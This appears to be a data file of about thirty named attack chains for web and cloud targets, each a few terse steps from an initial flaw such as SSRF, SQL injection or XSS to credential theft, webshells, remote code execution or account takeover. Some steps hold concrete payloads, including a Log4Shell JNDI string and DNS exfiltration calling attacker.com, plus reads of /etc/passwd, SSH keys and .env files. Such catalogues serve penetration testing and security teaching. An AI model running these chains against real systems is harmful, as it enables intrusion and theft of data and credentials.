chains.name: SSRF to Cloud Metadata
chains.description: Escalate SSRF to cloud metadata exfiltration and IAM credential theft

steps.description: Confirm SSRF with callback to attacker-controlled server
Steal IAM credentials from security-credentials/ endpoint

chains.name: SQLi to OS Command
steps: SQL injection
Write webshell via INTO OUTFILE or xp_cmdshell
RCE via webshell or OS command

chains.name: XSS to Cookie Steal
steps: XSS vulnerability
Steal session cookie via document.cookie
Session hijacking

chains.name: IDOR to Account Takeover
steps: IDOR vulnerability
Enumerate user IDs to find admin
Access/modify other accounts

chains.name: File Upload to RCE
steps: Unrestricted file upload
Upload webshell (PHP/JSP/ASPX)
Execute shell commands via HTTP

chains.name: LFI to RCE
steps: LFI vulnerability
Log poisoning via User-Agent injection
RCE via poisoned log include

chains.name: JWT Algorithm Confusion
steps: JWT token
Algorithm confusion (RS256→HS256 or alg:none)
Forge admin token

chains.name: OAuth Redirect Bypass
steps: OAuth implementation
Redirect URI bypass / open redirect
Steal authorization code

chains.name: Docker Breakout
steps: Container access via RCE
Privileged container escape
Host compromise

chains.name: Kubernetes Pod Escape
steps: K8s pod access
Service account token theft
Cluster privilege escalation

chains.name: SSTI to Full RCE
steps: Server-Side Template Injection found ({{7*7}}=49)
Escalate to OS command execution via template payload
Full server compromise

chains.name: Prototype Pollution to RCE
steps: Prototype pollution in Node.js merge/extend endpoint
Pollute process.binding or spawn prototype properties
Arbitrary command execution on server

chains.name: XXE to SSRF and File Read
steps: XXE injection in XML/SOAP/SVG
Read /etc/passwd and internal config files
SSRF to internal services via XXE SYSTEM entity

chains.name: GraphQL IDOR to Data Theft
steps: GraphQL introspection reveals schema and object types
Enumerate node(id:X) without ownership check
Exfiltrate cross-user data at scale via batched queries

chains.name: Deserialization to RCE
steps: Unsafe deserialization endpoint found
Craft ysoserial/pickle/phpggc payload
Remote code execution via gadget chain

chains.name: Cache Poison to Stored XSS
steps: Web cache poisoning via unkeyed header
Inject XSS payload into cached response body
XSS triggers for all users visiting the poisoned cached URL

chains.name: HTTP Smuggling to Auth Bypass
steps: CL.TE or TE.CL request smuggling confirmed
Smuggle prefix to internal admin endpoint
Access privileged functionality without authentication

chains.name: Path Traversal to Credential Theft
steps: Path traversal in file/page/path parameter
Read /etc/passwd, SSH keys, .env, application configs
Use extracted credentials for lateral movement

chains.name: Second-Order SQLi via Stored Input
steps: Store SQLi payload in profile/username/note field
Payload executes when admin queries stored data
Extract database contents or escalate to admin

chains.name: Mass Assignment to Admin Takeover
steps: Mass assignment in user/profile API endpoint
Add role=admin or is_admin=true to update request
Full admin panel access without legitimate credentials

chains.name: API Key Leakage to Full Account Takeover
steps: API key exposed in JS file or response header
Use key to authenticate as service account
Access all data and functionality of associated account

chains.name: Spring Boot Actuator to JMX RCE
steps: Spring Boot actuator endpoint exposed (/actuator)
Access /actuator/jolokia for JMX interface
Execute OS command via MBeanServer createMBean or invoke

chains.name: CORS Misconfig to Session Token Theft
steps: CORS policy reflects arbitrary Origin with credentials
Craft cross-origin JS to fetch /api/user with credentials:include
Steal session data / JWT token from authenticated victim

chains.name: Subdomain Takeover to Cookie Theft
steps: Dangling CNAME to unclaimed cloud service found
Register and claim the subdomain on the cloud provider
Set malicious cookie on *.domain.com to steal parent session

chains.name: SSRF to Redis Unauthorized Access
steps: SSRF vulnerability with internal network access
Probe internal ports via gopher:// or http:// to Redis (6379)
Execute Redis commands to write webshell or steal data

chains.name: Default Credentials to Internal Network
steps: Admin panel with default credentials found (admin/admin)
Access management interface with full privileges
Pivot to internal network via admin console features

chains.name: Open Redirect to OAuth Token Theft
steps: Open redirect in application (redirect_uri not validated)
Craft OAuth flow with attacker.com as redirect_uri
Steal authorization code from Referer header when victim redirects

chains.name: SQLi to Password Hash Dump and Crack
steps: SQL injection confirmed — extractable query
Dump password hashes from users table
Crack with hashcat — offline brute force common passwords

chains.name: Log4Shell JNDI to RCE
steps: Java application with Log4j detected
Inject ${jndi:ldap://attacker.com/a} in user-controlled log field
JNDI callback triggers class loading — arbitrary code execution

chains.name: Blind SSRF to OOB Data Exfiltration
steps: Blind SSRF via URL parameter or webhook
Exfiltrate internal data via DNS subdomain (data.attacker.com)
Decode DNS queries to reconstruct leaked content

chains.name: GraphQL Batching to Credential Stuffing
steps: GraphQL endpoint accepts batched mutation requests
Send 1000 login mutations in single request bypassing rate limit
Identify valid credentials from differential responses

chains.name: Account Enumeration to Targeted Brute Force
steps: Username enumeration via differential response (timing/message)
Build valid username list from registration or password reset
Targeted brute force against confirmed valid usernames
